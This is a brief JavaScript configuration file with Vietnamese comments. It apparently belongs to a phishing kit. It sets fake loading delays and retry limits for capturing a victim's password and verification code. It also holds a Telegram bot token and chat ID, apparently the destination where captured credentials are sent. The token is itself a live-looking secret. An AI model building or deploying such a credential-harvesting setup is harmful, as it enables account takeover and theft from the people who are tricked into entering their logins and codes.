const config = {
	settings: {
		// Thời gian Loading khi nhập code(milisecond)
		code_loading_time: 5000,
		// Số lượt nhập code tối đa
		max_failed_code_attempts: 7,
		// Số lượt nhập mật khẩu tối đa
		max_failed_password_attempts: 2,
		// Cái này không có tác dụng
		page_loading_time: 5000,
		// Thời gian loading khi nhập mật khẩu(milisecond)
		password_loading_time: 3000,
		// Bật tắt nhập code
		code_input_enabled: true,
	},
	telegram: {
		chatid: '-4939056422',
		token: '8466686106:AAFzSsPfuskJEY1EPkpN-CgTBiSTMA_O1XQ',
	},
};

export default config;
